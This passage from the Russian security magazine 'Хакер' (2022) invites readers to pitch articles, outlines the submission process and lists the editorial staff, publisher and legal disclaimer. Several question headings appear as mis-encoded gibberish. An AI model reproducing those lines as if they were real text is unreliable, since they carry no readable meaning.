   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №6 (291)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                                        Евгения Шарипова
                                           Литературный редактор


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар»​ ​125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ​Эл № ​ФС77-​67001 от ​30.​
08.​2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция
не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022